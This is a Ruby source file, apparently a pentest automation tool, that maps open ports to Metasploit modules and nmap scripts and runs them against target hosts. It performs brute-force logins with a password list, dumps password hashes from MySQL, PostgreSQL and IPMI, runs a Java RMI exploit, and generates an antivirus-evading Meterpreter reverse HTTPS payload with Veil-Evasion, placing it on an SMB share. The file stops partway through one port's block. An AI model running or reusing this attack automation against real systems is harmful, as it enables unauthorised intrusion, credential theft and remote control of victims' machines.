#!/usr/bin/env ruby
# -*- coding: binary -*-
# encoding: utf-8
require 'term/ansicolor'
require 'open3'
require 'packetfu'
require 'socket'
require 'sqlite3'
require 'macaddr'
require 'netaddr'
require 'ipaddr'
require 'time'
require 'timeout'
require 'pp'
require 'nmap/xml'
#Metasploit Modules Dependencies
#Requires https://github.com/rapid7/msfrpc-client
require 'rubygems'
require 'optparse'
require 'msfrpc-client'
require 'rex/ui'

class Color
	extend Term::ANSIColor
end

$passwordList = []
$verbose = false
$executableName = ''
$enableVeil = true

#Paths Setup
$veilPath = "/pentest/Veil-Evasion"

include PacketFu
$hostList = Array.new()
$scanList = Array.new()
$blackList = Array.new()
#$blackList<<'172.16.91.1'

def readPassword(filename)
	f = File.open(filename)
	f.each_line do |line|
	  $passwordList<<line
	end
f.close
end

def port_open?(ip, port, timeout)  
	start_time = Time.now  
	current_time = start_time  
	while (current_time - start_time) <= timeout  
		begin  
			TCPSocket.new(ip, port)  
			return true  
		rescue Errno::ECONNREFUSED  
			sleep 0.1  
		end  
		current_time = Time.now  
	end  
	return false  
end  

def generateVeil()
	print Color.green,Color.bold,'[*] Generating executable using Veil-Evasion',Color.clear+"\n"
	cmd = "rm /root/veil-output/compiled/*"
	run_cmd(cmd)
	
	cmd = "python2.7 "+$veilPath+"/Veil-Evasion.py -p python/meterpreter/rev_https -o sce.32 -c LHOST="+local_ip
	if $verbose==true
		puts run_cmd(cmd)
	else
		run_cmd(cmd)
	end
	cmd = "cp /root/veil-output/compiled/notepad.exe /var/smb_share/sce.32.exe"
	if $verbose==true
		puts run_cmd(cmd)
	else
		run_cmd(cmd)
	end
end

def runMsf(ipAddr,portList)
	for port in portList
		if port=="21"
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []

			puts "nmap --script ftp-brute -p 21 -iL hosts_port21.txt"
			puts "nmap --script ftp-proftpd-backdoor -p 21 -iL hosts_port21.txt"
			puts "nmap --script ftp-vsftpd-backdoor -p 21 -iL hosts_port21.txt"
			puts "nmap --script ftp-vuln-cve2010-4221 -p 21 -iL hosts_port21.txt"

			exploitList << "use auxiliary/scanner/ftp/anonymous"
			exploitList << "use auxiliary/scanner/ftp/ftp_login"
			exploitList << "use auxiliary/scanner/ftp/ftp_version"
			exploitList << "use auxiliary/scanner/ftp/titanftp_xcrc_traversal"

			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end

		if port==22
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/ssh/cerberus_sftp_enumusers"
			exploitList << "use auxiliary/scanner/ssh/ssh_enumusers"
			exploitList << "use auxiliary/scanner/ssh/ssh_identify_pubkeys"
			exploitList << "use auxiliary/scanner/ssh/ssh_login"
			exploitList << "use auxiliary/scanner/ssh/ssh_login_pubkey"
			exploitList << "use auxiliary/scanner/ssh/ssh_version"

			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==445
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			#preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/smb/smb_version"

			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					if x.include?("[*]")
						print Color.green,Color.bold,x,Color.clear,"\n"
					end
					#puts x
				end
			end
		end

		if port==80 or port==443 or port==8080
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/http/backup_file"
			exploitList << "use auxiliary/scanner/http/brute_dirs"
			exploitList << "use auxiliary/scanner/http/dir_scanner"
			exploitList << "use auxiliary/scanner/http/dir_webdav_unicode_bypass"
			exploitList << "use auxiliary/scanner/http/nginx_source_disclosure"

			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end

		if port==443
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			preMsf += "setg SSL true"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/http/tomcat_enum"
			exploitList << "use auxiliary/scanner/http/tomcat_mgr_login"

			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==1521

			# git clone https://github.com/quentinhardy/odat.git
			#odat
			#python2.7 odat.py  all -s 192.168.0.74

			#nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL 192.168.0.78

			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/oracle/sid_brute"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end			
		end

		if port==8080
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/http/jboss_status"
			exploitList << "use auxiliary/scanner/http/jboss_vulnscan"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end


		if port==123
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []			
			exploitList << "use auxiliary/scanner/ntp/ntp_monlist"
			exploitList << "use auxiliary/scanner/ntp/ntp_readvar"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end

		end

		if port==135
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/dcerpc/hidden"
			exploitList << "use auxiliary/scanner/dcerpc/management"
			exploitList << "use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end

		if port==623
			puts "ipmitool -I lanplus -C 0 -H x.x.x.x -U root -P password chassis status"
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/ipmi/ipmi_cipher_zero"
			exploitList << "use auxiliary/scanner/ipmi/ipmi_dumphashes"
			exploitList << "use auxiliary/scanner/ipmi/ipmi_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end


		if port==10000
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []			
			exploitList << "use auxiliary/admin/backupexec/dump"
			exploitList << "use auxiliary/admin/webmin/file_disclosure"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end	


		if port==512
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												

			exploitList << "use auxiliary/scanner/rservices/rexec_login"
			exploitList << "use auxiliary/scanner/rservices/rlogin_login"
			exploitList << "use auxiliary/scanner/rservices/rsh_login"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==513
			puts "nmap -p 513 --script rlogin-brute -iL hosts_port513.txt"
		end
		if port==548
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []														
			exploitList << "auxiliary/scanner/afp/afp_login"
	   		exploitList << "auxiliary/scanner/afp/afp_server_info"

			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==1098
			puts "nmap --script rmi-dumpregistry.nse -p 1098 -iL hosts_port1098.txt"
		end
		if port==1099
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			#nmap --script=rmi-vuln-classloader -p 1099 -iL host1099.txt
			exploitList << "use exploit/multi/misc/java_rmi_server"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==23
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			
			exploitList << "use auxiliary/scanner/telnet/lantronix_telnet_password"
			exploitList << "use auxiliary/scanner/telnet/lantronix_telnet_version"
			exploitList << "use auxiliary/scanner/telnet/telnet_encrypt_overflow"
			exploitList << "use auxiliary/scanner/telnet/telnet_login"
			exploitList << "use auxiliary/scanner/telnet/telnet_ruggedcom"
			exploitList << "use auxiliary/scanner/telnet/telnet_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==79
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			
			exploitList << "use auxiliary/scanner/finger/finger_users"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==111
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/misc/sunrpc_portmapper"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end		
		if port==902
			puts "nmap -p 902 --script vmauthd-brute -iL hosts_port902.txt"
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/vmware/vmauthd_login"
			exploitList << "use auxiliary/scanner/vmware/vmauthd_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==1128
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			
			exploitList << "use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==1158
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/scanner/oracle/emc_sid"
			exploitList << "use auxiliary/scanner/oracle/spy_sid"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==1900
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			puts "nmap -sU -p 1900 --script=upnp-info -iL hosts_port1900.txt"
			exploitList << "use auxiliary/scanner/upnp/ssdp_msearch"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end	
		if port==1720
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/h323/h323_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==2010
			puts "nmap -sT  -p 2010 --script=+jdwp-exec --script-args cmd=date -iL hosts_port2010.txt"
		end
		if port==3299
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/sap/sap_router_info_request"
			exploitList << "use auxiliary/scanner/sap/sap_router_portscanner"
			exploitList << "use auxiliary/scanner/sap/sap_service_discovery"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==3306
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/scanner/mysql/mysql_authbypass_hashdump"
			exploitList << "use auxiliary/scanner/mysql/mysql_file_enum"
			exploitList << "use auxiliary/scanner/mysql/mysql_hashdump"
			exploitList << "use auxiliary/scanner/mysql/mysql_login"
			exploitList << "use auxiliary/scanner/mysql/mysql_schemadump"
			exploitList << "use auxiliary/scanner/mysql/mysql_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==3500
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/emc/alphastor_librarymanager"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==5000
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/admin/hp/hp_data_protector_cmd"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==5038
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/voip/asterisk_login"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==5060
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/sip/enumerator"
			exploitList << "use auxiliary/scanner/sip/enumerator_tcp"
			exploitList << "use auxiliary/scanner/sip/options"
			exploitList << "use auxiliary/scanner/sip/options_tcp"
			exploitList << "use auxiliary/scanner/sip/sipdroid_ext_enum"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==5432
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			puts "nmap -p 5432 --script pgsql-brute -iL hosts_port5432.txt"
			exploitList << "use auxiliary/scanner/postgres/postgres_dbname_flag_injection"
			exploitList << "use auxiliary/scanner/postgres/postgres_hashdump"
			exploitList << "use auxiliary/scanner/postgres/postgres_login"
			exploitList << "use auxiliary/scanner/postgres/postgres_schemadump"
			exploitList << "use auxiliary/scanner/postgres/postgres_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==5560
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/scanner/oracle/isqlplus_sidbrute"
			exploitList << "use auxiliary/scanner/oracle/isqlplus_login"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==5631
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []														
			exploitList << "use auxiliary/scanner/pcanywhere/pcanywhere_login"
			exploitList << "use auxiliary/scanner/pcanywhere/pcanywhere_tcp"
			exploitList << "use auxiliary/scanner/pcanywhere/pcanywhere_udp"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end

		if port==5900
			puts "nmap --script vnc-brute -p 5900 -iL hosts_port5900.txt"
		end
		if port==5985
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/winrm/winrm_auth_methods"
			exploitList << "use auxiliary/scanner/winrm/winrm_cmd"
			exploitList << "use auxiliary/scanner/winrm/winrm_login"
			exploitList << "use auxiliary/scanner/winrm/winrm_wql"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==6000
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/x11/open_x11"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==6106
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			
			exploitList << "use auxiliary/admin/backupexec/registry"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==6379
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			
			exploitList << "use auxiliary/scanner/misc/redis_server"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==8000
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/admin/http/hp_web_jetadmin_exec"
			exploitList << "use auxiliary/scanner/http/barracuda_directory_traversal"
			exploitList << "use auxiliary/scanner/http/splunk_web_login"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
			
		end
		if port==8222
			puts "nmap --script http-vmware-path-vuln -p80,443,8222,8333 -iL hosts_port80.txt"
		end
		if port==8333
			puts "nmap --script http-vmware-path-vuln -p80,443,8222,8333 -iL hosts_port80.txt"
		end
		if port==8161
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/http/apache_activemq_source_disclosure"
			exploitList << "use auxiliary/scanner/http/apache_activemq_traversal"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==8222
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_login"
